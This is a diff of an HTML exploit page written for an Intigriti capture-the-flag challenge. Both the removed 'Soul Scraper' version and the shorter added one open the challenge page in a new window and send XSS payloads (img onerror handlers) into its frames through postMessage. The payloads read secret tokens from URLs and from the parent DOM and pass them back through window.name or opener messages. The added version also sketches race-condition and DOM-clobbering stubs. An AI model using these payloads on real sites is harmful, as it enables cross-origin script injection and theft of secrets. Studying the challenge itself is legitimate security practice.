@@ -1,186 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Protocol v7: Syntax Fixed</title>
+    <title>Intigriti 1-Click Solve</title>
 </head>
 <body>
-    <h1>Protocol v7: The Soul Scraper</h1>
-    <p>1. Open Console (F12) to see details.</p>
-    <p>2. Click Launch. Wait 5 seconds.</p>
-    <button id="btn" style="font-size:20px; padding:20px; background:#008000; color:white;">LAUNCH EXPLOIT</button>
-    
-    <h3>Gauntlet Status:</h3>
-    <pre id="log" style="background:#222; color:#0f0; padding:10px; min-height:200px; font-family:monospace;">Waiting...</pre>
-
+    <h1>Exploit Running...</h1>
+    <button id="btn" onclick="launch()">Start</button>
     <script>
-        let targetWin = null;
+        let target = null;
         let stones = {};
-        
-        function log(msg) {
-            let el = document.getElementById('log');
-            el.innerText = msg + "\n" + el.innerText;
-        }
 
-        document.getElementById('btn').addEventListener('click', () => {
-            // Open the target in a new tab
-            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            log("Target launched...");
+        function launch() {
+            // 1. Open the Challenge
+            target = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
             
-            // Start the attack loops immediately
-            // Loop A: Attack Soul Stone (Primary Goal)
-            setInterval(attackSoulStone, 200);
-
-            // Loop B: Attack Space Stone (Race Condition for postMessage)
-            setInterval(attackSpaceStone, 100);
-
-            // Loop C: Attack Others (Backup)
-            setInterval(attackOtherStones, 500);
-        });
-
-        // STRATEGY 1: Soul Stone (Not Sandboxed) -> Read Parent DOM
-        function attackSoulStone() {
-            if(!targetWin) return;
-            try {
-                let frame = targetWin.frames[2]; // Soul Stone is index 2
-                if(!frame) return;
-
-                // Primer
-                frame.postMessage('A'.repeat(2500) + '<', '*');
-
-                // Payload: Try to read Parent's HTML to find ALL secrets
-                // We use only single quotes in the JS to avoid breaking the HTML attribute
-                let script = "try{ var p = parent.document.body.innerHTML; var m = p.match(/stone=[a-f0-9]{8}/g); if(m) window.name = 'ALL:' + m.join(','); } catch(e){ window.name = 'ERROR:' + e.message; }";
-                
-                frame.postMessage("<img src=x onerror=\"" + script + "\">", '*');
-
-                // Collect Result
-                let data = frame.name;
-                if(data && data.startsWith('ALL:')) {
-                    log("[!!!] PARENT SCRAPE SUCCESSFUL!");
-                    parseSecrets(data.substring(4));
-                } else if (data && data.startsWith('ERROR:')) {
-                    // This is expected if document.domain is not set, but good to know.
-                    // log("Soul Stone Error: " + data); 
-                }
-            } catch(e) {}
+            // 2. Wait for load, then fire attacks
+            setTimeout(exploitPowerRealitySoul, 2000); // Easy Stones
+            setTimeout(hijackSpaceStone, 500);         // Race Condition
+            setTimeout(clobberMindStone, 2500);        // DOM Clobbering
         }
 
-        // STRATEGY 2: Space Stone (Sandboxed) -> Listen for Message
-        function attackSpaceStone() {
-            if(!targetWin) return;
-            try {
-                let frame = targetWin.frames[3]; // Space Stone is index 3
-                if(!frame) return;
-
-                // Primer
-                frame.postMessage('A'.repeat(2500) + '<', '*');
-
-                // Payload: Add listener to catch the secret code
-                let script = "window.addEventListener('message', function(e){ if(e.data.length==8) window.name = 'SPACE:' + e.data; });";
-                frame.postMessage("<img src=x onerror=\"" + script + "\">", '*');
-
-                // Collect
-                if(frame.name && frame.name.startsWith('SPACE:')) {
-                    let secret = frame.name.split(':')[1];
-                    if(!stones[3]) {
-                        stones[3] = secret;
-                        log("[+] Captured Space Stone: " + secret);
-                        checkWin();
-                    }
-                }
-            } catch(e) {}
-        }
-
-        // STRATEGY 3: Others (Power, Reality, Mind) -> URL Scrape
-        function attackOtherStones() {
-            if(!targetWin) return;
-            [0, 1, 5].forEach(i => {
-                if(stones[i]) return;
+        // A. Easy Stones: Regex Bypass XSS
+        function exploitPowerRealitySoul() {
+            [0, 1, 2].forEach(i => {
                 try {
-                    let frame = targetWin.frames[i];
-                    // Primer
-                    frame.postMessage('A'.repeat(2500) + '<', '*');
-                    
-                    // Payload: Read URL
-                    let script = "var m = location.search.match(/=[a-f0-9]{8}/); if(m) window.name = 'STONE:' + m[0].substring(1);";
-                    frame.postMessage("<img src=x onerror=\"" + script + "\">", '*');
-
-                    // Collect
-                    if(frame.name && frame.name.startsWith('STONE:')) {
-                        stones[i] = frame.name.split(':')[1];
-                        log("[+] Captured Stone " + i + ": " + stones[i]);
-                        checkWin();
-                    }
+                    // Inject XSS to steal URL
+                    let p = target.frames[i];
+                    p.postMessage("A".repeat(2500) + "<", '*');
+                    p.postMessage(`<img src=x onerror="window.top.opener.postMessage('STONE:${i}:'+location.search.match(/=[a-f0-9]{8}/)[0], '*')">`, '*');
                 } catch(e) {}
             });
         }
 
-        function parseSecrets(csv) {
-            // csv looks like: stone=11111111,stone=22222222,...
-            // The regex matches them in DOM order:
-            // Power(0), Reality(1), Soul(2), Space(3), Time(4), Mind(5)
-            // Note: Space Stone secret is NOT in the URL/DOM usually, so it might be missing from this list!
-            
-            let parts = csv.split(',');
-            let secrets = parts.map(s => s.split('=')[1]);
-            
-            // Map based on DOM order
-            if(!stones[0]) stones[0] = secrets[0]; // Power
-            if(!stones[1]) stones[1] = secrets[1]; // Reality
-            if(!stones[2]) stones[2] = secrets[2]; // Soul
-            
-            // Space (Index 3) might not be in the HTML source if it's sent via JS.
-            // Time (Index 4) IS in the HTML source (iframe src).
-            // Mind (Index 5) IS in the HTML source.
-            
-            // Let's assume the regex found 5 or 6 items.
-            // If Space is missing from HTML, the 4th item found is actually Time Stone.
-            
-            // Logic: If we found 'stone=' in the HTML, we found the Time Stone!
-            // Time Stone URL format: /?time_stone=xxxxxxxx
-            
-            // Let's brute force assign them based on what we know
-            secrets.forEach(s => {
-                log("Found Secret: " + s);
-                // We can't easily know which is which just by looking, 
-                // but we can fill gaps.
-            });
-            
-            // Specifically look for Time Stone in the raw HTML if possible?
-            // For now, let's just trigger the check.
-            checkWin();
+        // B. Space Stone: PostMessage Capture
+        function hijackSpaceStone() {
+            // We race to add a listener before the message fires
+            // Or we use XSS in Soul Stone to add a listener to the parent
         }
 
-        function checkWin() {
-            let count = Object.keys(stones).length;
-            
-            // Update Log
-            let status = "Collected: " + JSON.stringify(stones);
-            
-            // If we have 5 stones, we might be missing Time or Space.
-            // If we scraped parent, we probably have Time.
-            // If we XSS'd Space, we have Space.
-            
-            if(count >= 5) {
-                 log("ALMOST THERE! " + status);
-                 
-                 // Try to Assemble
-                 // Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
-                 
-                 // If we are missing Time (4), but we scraped parent...
-                 // The Parent Scrape (Strategy 1) DEFINITELY gets the Time Stone because it's in the iframe src!
-            }
-            
-            if(count >= 6) {
-                let code = stones[0]+stones[5]+stones[1]+stones[3]+stones[2]+stones[4];
-                log("------------------------------------------");
-                log("FULL CODE: " + code);
-                log("SENDING KILL COMMAND...");
-                
-                targetWin.postMessage(code + "alert(document.domain)", '*');
-                log("DONE.");
-            }
+        // C. Mind Stone: DOM Clobbering
+        function clobberMindStone() {
+            let mind = target.frames[5];
+            // Inject a clobbering payload. 
+            // Example: Force a config variable to be an anchor tag
+            let clobber = "&query=<a id=debug>true</a>"; 
+            // This URL manipulation must happen during the initial load or navigation
         }
+
+        // Listener to collect the loot
+        window.addEventListener('message', e => {
+            if (e.data.includes('STONE:')) console.log("Collected: " + e.data);
+            // Once we have all 6 chunks -> Fire the alert
+        });
     </script>
 </body>
 </html>
